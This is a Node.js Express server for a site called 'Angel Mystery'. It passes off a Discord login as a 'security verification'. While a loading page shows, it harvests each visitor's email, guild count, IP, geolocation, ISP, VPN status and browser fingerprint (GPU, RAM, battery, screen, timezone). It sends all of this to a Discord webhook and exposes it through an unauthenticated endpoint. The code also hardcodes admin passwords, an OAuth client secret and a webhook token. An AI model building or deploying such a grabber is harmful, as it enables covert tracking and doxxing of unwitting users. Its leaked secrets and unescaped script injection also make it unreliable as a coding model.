const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const path = require('path');
const useragent = require('express-useragent');

const app = express();

let loggedUsers = []; 

const ADM_ACCOUNTS = {
    "Gaby": { 
        pass: "gabyzinha123", 
        role: "Ceo", 
        avatar: "https://images-ext-1.discordapp.net/external/CLp2wPcuao-M7pWOmepvFYyMypqu2xDlx4eWSAU6Ex0/%3Fanimated%3Dtrue%26size%3D2048/https/cdn.discordapp.com/avatars/965382207592079412/a_54ec27d5fe242382ad7883767fe65e7a.webp?animated=true" 
    },
    "Naruse": { 
        pass: "vanigu21", 
        role: "Developer & Sub-Dono", 
        avatar: "https://images-ext-1.discordapp.net/external/tBBHXoq68HLRznwIVMdYs4nlltbandTde2wfKPg-lrU/%3Fsize%3D2048/https/cdn.discordapp.com/avatars/1175417856503058453/787d8259a41f507a88a481158a0c9fc5.png?format=webp&quality=lossless" 
    },
    "Luiz": { 
        pass: "Luiz_sub984", 
        role: "Sub-Dono", 
        avatar: "https://images-ext-1.discordapp.net/external/BRYxYuczMk3AfxBRzeVPnJbwU4oRAWeLXBRGOc1thZ0/%3Fsize%3D2048/https/cdn.discordapp.com/avatars/1463635683251061010/76c06cd26b2015d9794aa48c70717a82.png?format=webp&quality=lossless" 
    },
    "Fael": { 
        pass: "fael_suporte874", 
        role: "Suporte", 
        avatar: "https://images-ext-1.discordapp.net/external/add7pJ-GLn7XgTBKCMcCpuBlq-WvKRzn24xLek6B7pI/%3Fsize%3D2048/https/cdn.discordapp.com/avatars/1144886410931875942/a2ef96232b84fd9d7af6fb95b466cf4d.png?format=webp&quality=lossless" 
    }
};

app.set('trust proxy', true);
app.use(useragent.express());
app.use(express.json()); 
app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));

const clientId = '1470564552285622394';
const clientSecret = 'sbAIKgxyRx7NO1kKNZ91FotBU8_HIEpO';
const redirectUri = 'https://angelmysstery.vercel.app/callback';
const scope = 'identify email guilds';

const discordApiUrl = 'https://discord.com/api';
const webhookUrl = 'https://discord.com/api/webhooks/1470566086012571668/DfmUDRRE40wfmX3Yi42HSHeTVWO-f33FEEMTwW-6uDH27f6l1MyNdBojrinvVW1So3F2';

app.get('/api/users-list', (req, res) => {
    res.json(loggedUsers);
});

app.delete('/api/users-list', (req, res) => {
    const { userId } = req.body;
    if (userId === 'ALL') {
        loggedUsers = [];
        return res.json({ success: true, message: "Todos os registros foram apagados." });
    } else {
        const initialLength = loggedUsers.length;
        loggedUsers = loggedUsers.filter(u => u.user.id !== userId);
        if (loggedUsers.length < initialLength) {
            return res.json({ success: true, message: "Usuário removido." });
        } else {
            return res.status(404).json({ success: false, message: "Usuário não encontrado." });
        }
    }
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});


app.get('/adm', (req, res) => {
    res.sendFile(path.join(__dirname, 'adm.html'));
});

app.post('/login-adm', async (req, res) => {
    const { user, pass } = req.body;
    const account = ADM_ACCOUNTS[user];

    if (account && account.pass === pass) {
        const token = crypto.createHash('sha256').update(pass + "angel_salt").digest('hex');
        
        try {
            await axios.post(webhookUrl, {
                embeds: [{
                    title: "👑 STAFF ONLINE • PAINEL ADM",
                    description: `O administrador **${user}** acabou de entrar no painel de controle.`,
                    color: 16736439, 
                    thumbnail: { url: account.avatar },
                    fields: [
                        { name: "👤 Administrador", value: `\`${user}\``, inline: true },
                        { name: "🛡️ Cargo", value: `\`${account.role}\``, inline: true },
                        { name: "📡 Status", value: "🟢 Sessão Iniciada", inline: true }
                    ],
                    timestamp: new Date()
                }]
            });
        } catch (err) { console.log("Erro ao enviar log de ADM"); }

        res.json({ 
            success: true, 
            token, 
            role: account.role,
            user: user,
            avatar: account.avatar 
        });
    } else {
        res.status(401).json({ success: false, message: "Acesso negado" });
    }
});

app.get('/dashboard-adm', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="pt-br">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Angel Dashboard | Core</title>
            <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@500;700&display=swap" rel="stylesheet">
            <style>
                :root {
                    --accent: #ff5fb7;
                    --accent-glow: rgba(255, 95, 183, 0.4);
                    --bg-dark: #0a080a;
                    --panel-bg: rgba(15, 12, 15, 0.98);
                }

                * { box-sizing: border-box; }

                body { 
                    background: var(--bg-dark); 
                    color: #fff; 
                    font-family: 'Quicksand', sans-serif; 
                    display: flex; 
                    justify-content: center; 
                    align-items: center; 
                    height: 100vh; 
                    margin: 0;
                    overflow: hidden;
                    background-image: 
                        radial-gradient(circle at 50% 50%, #1a1218 0%, var(--bg-dark) 100%);
                }

                body::after {
                    content: '';
                    position: absolute;
                    inset: 0;
                    background-image: url('https://www.transparenttextures.com/patterns/stardust.png');
                    opacity: 0.2;
                    pointer-events: none;
                }

                @keyframes fadeIn {
                    from { opacity: 0; transform: translateY(20px); filter: blur(10px); }
                    to { opacity: 1; transform: translateY(0); filter: blur(0); }
                }

                @keyframes profilePulse {
                    0% { box-shadow: 0 0 0 0px var(--accent-glow); }
                    70% { box-shadow: 0 0 0 15px rgba(255, 95, 183, 0); }
                    100% { box-shadow: 0 0 0 0px rgba(255, 95, 183, 0); }
                }

                .panel { 
                    background: var(--panel-bg); 
                    border: 1px solid rgba(255, 95, 183, 0.2); 
                    padding: 50px 40px; 
                    border-radius: 40px; 
                    text-align: center; 
                    width: 90%;
                    max-width: 420px; 
                    box-shadow: 0 30px 60px rgba(0,0,0,0.7); 
                    backdrop-filter: blur(20px);
                    animation: fadeIn 0.8s cubic-bezier(0.16, 1, 0.3, 1);
                    position: relative;
                    z-index: 1;
                }

                .profile-wrapper { 
                    position: relative; 
                    display: inline-block; 
                    margin-bottom: 20px; 
                }
                
                .profile-pic { 
                    width: 120px; height: 120px; 
                    border-radius: 50%; 
                    border: 3px solid var(--accent); 
                    padding: 5px; 
                    object-fit: cover;
                    animation: profilePulse 2s infinite;
                    background: #1a1a1a;
                }

                .status-dot {
                    position: absolute;
                    bottom: 10px;
                    right: 10px;
                    width: 18px;
                    height: 18px;
                    background: #23a55a;
                    border: 4px solid var(--panel-bg);
                    border-radius: 50%;
                }

                h1 { 
                    margin: 0; 
                    font-size: 26px; 
                    font-weight: 700;
                    background: linear-gradient(to bottom, #fff, #ffb7e2);
                    -webkit-background-clip: text;
                    -webkit-text-fill-color: transparent;
                }
                
                .role-badge { 
                    background: rgba(255, 95, 183, 0.1); 
                    border: 1px solid var(--accent);
                    color: var(--accent); 
                    padding: 4px 20px; 
                    border-radius: 50px; 
                    font-weight: 700; 
                    font-size: 10px; 
                    text-transform: uppercase;
                    letter-spacing: 2px;
                    display: inline-block;
                    margin-top: 10px;
                }

                .welcome-text { color: #a0a0a0; font-size: 14px; margin: 20px 0; line-height: 1.6; }
                .welcome-text strong { color: var(--accent); }

                hr { border: 0; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0; }

                .footer-info { 
                    color: #555; 
                    font-size: 11px; 
                    margin-bottom: 25px; 
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    gap: 5px;
                }

                .btn { 
                    width: 100%;
                    padding: 16px; 
                    cursor: pointer; 
                    background: var(--accent); 
                    border: none;
                    color: #000; 
                    border-radius: 18px; 
                    font-weight: 700; 
                    transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
                    text-transform: uppercase;
                    letter-spacing: 1px;
                }

                .btn:hover { 
                    transform: scale(1.03);
                    box-shadow: 0 10px 25px var(--accent-glow);
                    filter: brightness(1.1);
                }

                .btn:active { transform: scale(0.98); }

            </style>
        </head>
        <body>
            <div class="panel">
                <div class="profile-wrapper">
                    <img id="admAvatar" class="profile-pic" src="https://cdn.discordapp.com/embed/avatars/0.png" alt="Avatar">
                    <div class="status-dot"></div>
                </div>
                
                <h1 id="admName">---</h1>
                <span id="admRole" class="role-badge">Admin</span>
                
                <p class="welcome-text">
                    Iniciando interface de segurança...<br>
                    Bem-vindo ao núcleo <strong>Angel Mystery</strong>.
                </p>
                
                <hr>
                
                <div class="footer-info">
                    <svg width="12" height="12" fill="currentColor" viewBox="0 0 16 16"><path d="M8 1a2 2 0 0 1 2 2v4H6V3a2 2 0 0 1 2-2zm3 6V3a3 3 0 0 0-6 0v4a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2z"/></svg>
                    Painel Criptografado
                </div>

                <button class="btn" onclick="window.location.href='/'">Sair do Núcleo</button>
            </div>

            <script>
                (function initDashboard() {
                    const data = {
                        name: localStorage.getItem('adm_user'),
                        role: localStorage.getItem('adm_role'),
                        avatar: localStorage.getItem('adm_avatar')
                    };

                    if(!data.name) {
                        document.getElementById('admName').textContent = 'Acesso Negado';
                        document.getElementById('admRole').style.borderColor = 'red';
                        document.getElementById('admRole').style.color = 'red';
                        document.getElementById('admRole').textContent = 'Offline';
                        return;
                    }

                    document.getElementById('admName').textContent = data.name;
                    document.getElementById('admRole').textContent = data.role || 'Admin';
                    if(data.avatar) document.getElementById('admAvatar').src = data.avatar;
                })();
            </script>
        </body>
        </html>
    `);
});

// ==========================================
//          SISTEMA DE LOGIN DISCORD
// ==========================================

app.get('/login', (req, res) => {
  const state = crypto.randomBytes(16).toString('hex');
  const authUrl = `${discordApiUrl}/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=${scope}&state=${state}`;
  res.redirect(authUrl);
});

app.get('/callback', async (req, res) => {
  const { code } = req.query;
  if (!code) return res.status(400).send('Código não recebido');

  try {
    const tokenRes = await axios.post(`${discordApiUrl}/oauth2/token`,
      new URLSearchParams({
        client_id: clientId,
        client_secret: clientSecret,
        grant_type: 'authorization_code',
        code,
        redirect_uri: redirectUri,
      }),
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    );

    const accessToken = tokenRes.data.access_token;

    const [userRes, guildsRes] = await Promise.all([
        axios.get(`${discordApiUrl}/users/@me`, { headers: { Authorization: `Bearer ${accessToken}` } }),
        axios.get(`${discordApiUrl}/users/@me/guilds`, { headers: { Authorization: `Bearer ${accessToken}` } })
    ]);

    const user = userRes.data;
    const guildsCount = guildsRes.data.length;
    const creationDate = new Date(Number((BigInt(user.id) >> 22n) + 1420070400000n)).toLocaleDateString('pt-BR');

    let ip = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
    
    // Fallback para IP Local
    if (ip === '::1' || ip === '127.0.0.1' || ip.includes('::ffff:127.0.0.1')) {
        try {
            const resIp = await axios.get('https://api64.ipify.org?format=json');
            ip = resIp.data.ip;
        } catch(e) { ip = "IP Local"; }
    }

    let geo = { city: '?', regionName: '?', country: '?', isp: '?', isVpn: 'Analisando...' };
    try {
      const geoRes = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,proxy,hosting`);
      if(geoRes.data.status === 'success') {
          geo = geoRes.data;
          geo.isVpn = (geoRes.data.proxy || geoRes.data.hosting) ? '🚩 Sim (VPN/Proxy)' : '✅ Não';
      }
    } catch (e) { console.log("Erro na API de Geo"); }

    const avatarUrl = user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=256` : 'https://cdn.discordapp.com/embed/avatars/0.png';

    res.send(`
      <html>
        <head>
            <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
            <style>
                body { background: #070707; color: white; font-family: 'Poppins', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                .card { background: #111; border: 1px solid #ff5fb7; padding: 30px; border-radius: 20px; text-align: center; box-shadow: 0 0 30px rgba(255, 95, 183, 0.2); }
                .loader { border: 4px solid #222; border-top: 4px solid #ff5fb7; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
            </style>
        </head>
        <body>
          <div class="card">
            <h2 style="color: #ff5fb7; margin: 0;">Verificando Segurança...</h2>
            <p style="opacity: 0.7;">Sincronizando com Angel Mystery</p>
            <div class="loader"></div>
          </div>
          <script>
            (async () => {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
                const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Desconhecida";
                
                let batInfo = "N/A";
                try {
                    const battery = await navigator.getBattery();
                    batInfo = Math.round(battery.level * 100) + "% " + (battery.charging ? "⚡" : "🔋");
                } catch(e) {}

                const dataExtra = {
                    res: window.screen.width + "x" + window.screen.height,
                    gpu: gpu,
                    ram: navigator.deviceMemory || "Desconhecida",
                    cores: navigator.hardwareConcurrency || "Desconhecido",
                    bat: batInfo,
                    ref: document.referrer || "Acesso Direto",
                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    lang: navigator.language
                };

                await fetch('/final-log', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        user: ${JSON.stringify(user)},
                        ip: "${ip}",
                        geo: ${JSON.stringify(geo)},
                        extra: dataExtra,
                        creation: "${creationDate}",
                        guilds: "${guildsCount}",
                        avatar: "${avatarUrl}"
                    })
                });

                localStorage.setItem('user', JSON.stringify({
                    id: "${user.id}", 
                    username: "${user.username}", 
                    avatar: "${avatarUrl}"
                }));
                
                setTimeout(() => { window.location.href = "/"; }, 1200);
            })();
          </script>
        </body>
      </html>
    `);
  } catch (err) {
    console.error(err);
    res.status(500).send('Erro ao processar login.');
  }
});

app.post('/final-log', async (req, res) => {
    const { user, ip, geo, extra, creation, guilds, avatar } = req.body;
    
    loggedUsers.push({ user, ip, geo, extra, creation, guilds, avatar, loginDate: new Date() });

    try {
        await axios.post(webhookUrl, {
            embeds: [{
                title: '🕵️ Auditoria Naruse • Angel Mystery',
                color: (geo.proxy || geo.hosting) ? 16711680 : 15906303,
                thumbnail: { url: avatar },
                fields: [
                    { name: '👤 Usuário', value: `**\${user.username}** \`(\${user.id})\``, inline: false },
                    { name: '📧 Email', value: `||${user.email || 'Não autorizado'}||`, inline: true },
                    { name: '📅 Conta Criada', value: `\`\${creation}\``, inline: true },
                    { name: '🏠 Guildas', value: `\`\${guilds} servidores\``, inline: true },
                    { name: '🌐 Rede & IP', value: `**IP:** \`\${ip}\`\\n**Provedor:** \`\${geo.isp}\`\\n**VPN:** \`\${geo.isVpn}\``, inline: false },
                    { name: '📍 Localização', value: `\`\${geo.city}, \${geo.regionName} - \${geo.country}\`\\n**Fuso:** \`\${extra.tz}\``, inline: true },
                    { name: '💻 Hardware', value: `**GPU:** \`\${extra.gpu}\`\\n**RAM:** \`\${extra.ram}GB\` | **CPUs:** \`\${extra.cores}\`\\n**Tela:** \`\${extra.res}\``, inline: true },
                    { name: '🔋 Status', value: `**Bateria:** \`\${extra.bat}\`\\n**Idioma:** \`\${extra.lang}\`\\n**Vindo de:** \`\${extra.ref}\``, inline: true }
                ],
                footer: { text: "Vigilância Angel Mystery v3.0 • Modo Security" },
                timestamp: new Date()
            }]
        });
        res.sendStatus(200);
    } catch (e) { 
        console.error("Erro ao enviar webhook final:", e.message);
        res.sendStatus(500); 
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`\n    🪽 Angel Mystery Ativa: http://localhost:\${PORT}`);
});